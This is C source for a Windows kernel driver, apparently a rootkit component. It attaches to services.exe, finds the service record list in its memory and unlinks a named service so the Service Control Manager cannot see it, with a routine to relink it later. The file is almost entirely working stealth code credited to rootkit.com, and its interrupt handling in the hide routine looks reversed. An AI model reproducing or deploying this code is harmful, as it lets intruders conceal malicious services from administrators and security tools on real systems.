#include <ntddk.h>
#include "process.h"
#include "service.h"

/*
     Another option who cost me a few nights...

     We hide a service by attaching to services.exe process.
     we need to manually find the service list entry (double-chained list) and 
     to modify id.
     Thx to i.m.weasel for showing us this strong method to hide a service from 
     the SC Manager :)
     http://www.rootkit.com/newsread.php?newsid=419 
*/

typedef unsigned char BOOL;

PSERVICE_RECORD HiddenService[128];
ULONG NbHiddenServices=0;

// ptr to the first service 
PSERVICE_RECORD srecord=NULL;

//#define PAGE_SIZE 4096

// get ptr to an EPROCESS struct from the name (i.m.weasel)
NTSTATUS GetEProcessByName(WCHAR *processname, PEPROCESS *proc)
{
  NTSTATUS status;
  PSYSTEM_PROCESS_INFORMATION info, curr;
  ULONG info_size = PAGE_SIZE, result_size;
  ULONG ProcessId = 0;
  CLIENT_ID ClientId;
  OBJECT_ATTRIBUTES ObjectAttributes;
  PVOID Object;
  ULONG length;
  HANDLE Services_process;

  *proc = NULL;
  
  while(TRUE) {
    info = ExAllocatePool (NonPagedPool, info_size);
    if (info == NULL)
      return STATUS_NO_MEMORY;
      
    status = ZwQuerySystemInformation (
       5,                // process request
       info, 
       info_size, 
       &result_size);
       
    if( NT_SUCCESS(status) ) 
      break;
    
    ExFreePool(info);
    

      
    if( status != STATUS_INFO_LENGTH_MISMATCH )   
      return STATUS_NO_MEMORY;

    // otherwise, we need to allocate more memory
    info = NULL;
    info_size += PAGE_SIZE; 
  }
    
  length = wcslen(processname);
  curr = info;
  
  do {
    if((curr->ProcessName.Length == (length * sizeof (WCHAR))) && 
        !memcmp(processname, curr->ProcessName.Buffer, curr->ProcessName.Length))
    {
      // it's our services.exe  
      ProcessId = curr->ProcessId;
      break;
    }
    
    
    if(curr->NextEntryDelta)
       (PBYTE)curr  += (curr->NextEntryDelta);
       
  } while(curr->NextEntryDelta); 


  ExFreePool(info);

  if (!ProcessId)
    return STATUS_NOT_FOUND;

  InitializeObjectAttributes(
     &ObjectAttributes, 
     NULL, 
     OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 
     0, 
     0);
  
  ClientId.UniqueProcess = (HANDLE)ProcessId;
  ClientId.UniqueThread = 0;
  
  status = ZwOpenProcess(
              &Services_process, 
              PROCESS_ALL_ACCESS, 
              &ObjectAttributes, 
              &ClientId);

  if ( !NT_SUCCESS(status) )
    return status;


  status = ObReferenceObjectByHandle (
              Services_process, 
              PROCESS_ALL_ACCESS, 
              NULL, 
              KernelMode, 
              &Object, 
              NULL);
              
  ZwClose (Services_process);

  if (!NT_SUCCESS(status))
    return status;

  *proc = (PEPROCESS)Object;
  return STATUS_SUCCESS;
}

// find a section in a module (i.m.weasel)
PIMAGE_SECTION_HEADER FindModuleSectionHdr(PVOID module, const char *section)
{
   PIMAGE_DOS_HEADER dos;
   PIMAGE_NT_HEADERS nth;
   PIMAGE_SECTION_HEADER sec;
   ULONG snlen, addr, i;

   if (!module)
      return NULL;

   dos     = (PIMAGE_DOS_HEADER) module;
   nth     = (PIMAGE_NT_HEADERS) (dos->e_lfanew + (char *)module);
   sec     = IMAGE_FIRST_SECTION(nth);

   snlen = strlen (section);
   for (i = 0; i < nth->FileHeader.NumberOfSections; i++, (PBYTE)sec+=sizeof(IMAGE_SECTION_HEADER)) {
       
     if (!_strnicmp (sec->Name, section, snlen)) 
      return sec; 
   }
   return NULL;
}

// verify if the given ptr points to a valid address
BOOL IsGoodPtr( PVOID ptr, ULONG size )
{
   ULONG i = 0;
   
   for(i=0; i<size; i++)
      if( !MmIsAddressValid( (PULONG)ptr+i) )
         return FALSE;
         
   return TRUE;           
}

NTSTATUS HideFromSCManager(WCHAR *service)
{
  NTSTATUS status;
  PEPROCESS proc;
  PROCESS_BASIC_INFORMATION pbi;
  ULONG *ptr, *ptr2;
  PPEB peb;
  PIMAGE_SECTION_HEADER dsh; // data section headers
  PSERVICE_RECORD curr, prev=NULL, next=NULL;
  PVOID dsec;
  ULONG ServiceNameLen, ServiceToHideNameLen, dsecsize, n, i;
   
  if( NbHiddenServices >= 128 )
     return STATUS_UNSUCCESSFUL;

  // we look for services.exe EPROCESS struct
  status = GetEProcessByName (L"SERVICES.EXE", &proc);
  if( !NT_SUCCESS(status) ) {
    status = GetEProcessByName (L"services.exe", &proc);  
    if( !NT_SUCCESS(status) )  
       return status;
  }

  
  // we attach to it :)
  KeAttachProcess(proc); 
  
  
  // we get infos about current process
  status = ZwQueryInformationProcess(NtCurrentProcess(),
     ProcessBasicInformation, 
     &pbi, 
     sizeof(pbi), 
     0);
  
     
  if( !NT_SUCCESS(status) ) {
     KeDetachProcess();
     return status;    
  }
  
  peb = pbi.PebBaseAddress; 
  
  // look for data section
  dsh = FindModuleSectionHdr(peb->ImageBaseAddress, ".data");                  
                                                                                  
  if( !dsh ) {
     KeDetachProcess();
     return STATUS_UNSUCCESSFUL;   
  }
  
  
  // get section size & offset
  dsecsize = dsh->SizeOfRawData;
  dsec = dsh->VirtualAddress + (PUCHAR)peb->ImageBaseAddress;
  
  /*
      We have now to find the beginning of the service table in the .data section.
      As weasel said, to identify it, we look for a null ptr followed by a valid 
      memory address.
  */
  
  if( !srecord ) {
     for(ptr=(PULONG)dsec, n=dsecsize>>2; n ;  n--,ptr++) {
      
        if( !IsGoodPtr(ptr, 2*sizeof(ULONG)) )
           continue;
     
        if ( (ptr[0] == 0UL) && // our null byte
             (ptr[1] != 0UL) && 
             (ptr[1] < (ULONG)MM_HIGHEST_USER_ADDRESS) && 
             !(ptr[1]&1)) 
        {
           if( IsGoodPtr(ptr, sizeof(SERVICE_RECORD)) ) {
           
            
              if( !MmIsAddressValid(&((PSERVICE_RECORD)ptr[1])->sErv))
                 continue; 
           
              // we look for the sErv tag  
              if( ((PSERVICE_RECORD)ptr[1])->PreviousServiceRecord == (PSERVICE_RECORD)ptr &&
                 ((PSERVICE_RECORD)ptr[1])->sErv == 'vrEs' ) {                       
                 srecord = (PSERVICE_RECORD)ptr;      
                 break;         
              } 
           }
        }  
     }     
  }
  if( !srecord ) {
     // :(
     KeDetachProcess();
     return STATUS_UNSUCCESSFUL;    
  }
  
  curr=srecord;
  ServiceToHideNameLen = wcslen(service); 
  
  while( curr ) {
     if( curr->Lp_WideServiceName == NULL ) {
        curr = curr->NextServiceRecord;
        continue;
     }   
     
     ServiceNameLen = wcslen( curr->Lp_WideServiceName );
     
     if(  ServiceToHideNameLen == ServiceNameLen &&
          !memcmp(curr->Lp_WideServiceName, service, (ServiceNameLen+1)*2))
     {
          
           // process to hide    
           next = curr->NextServiceRecord;
           prev = curr->PreviousServiceRecord;
           
   
           // we hide the service, like for DKOM
           _asm sti
           
           if(next) 
              next->PreviousServiceRecord = prev; 
           if(prev) 
              prev->NextServiceRecord = next;
              
           // note that we can't hide the first service, we don't know 
           // how to access the list right.  

           _asm cli 
            
           // we get data usefull to restore the service later
           HiddenService[NbHiddenServices] = curr;
           NbHiddenServices++;  
      }
      
      curr = curr->NextServiceRecord;      
  }

  KeDetachProcess();
  return status;
}


NTSTATUS UnhideFromSCManager()
{
  NTSTATUS status;
  PEPROCESS proc;
  ULONG i;
  PSERVICE_RECORD prev, next;

  if( !NbHiddenServices ) 
     // no hidden services
     return STATUS_SUCCESS;

  // on ouvre comme avant notre services.exe
  status = GetEProcessByName (L"SERVICES.EXE", &proc);
  if( !NT_SUCCESS(status) ) {
    status = GetEProcessByName (L"services.exe", &proc);  
    if( !NT_SUCCESS(status) )
       return status;
  }

  // we attach to process
  KeAttachProcess(proc); 
  
  __asm cli
  for(i=0; i<NbHiddenServices; i++) {    
     
     next = HiddenService[i]->NextServiceRecord;
     prev = HiddenService[i]->PreviousServiceRecord;
           
     // we relink the service
     if( prev )
        prev->NextServiceRecord = HiddenService[i]; 
     if( next )
        next->PreviousServiceRecord = HiddenService[i];      
                
  }
  __asm sti

  KeDetachProcess();
  return status;
}
  
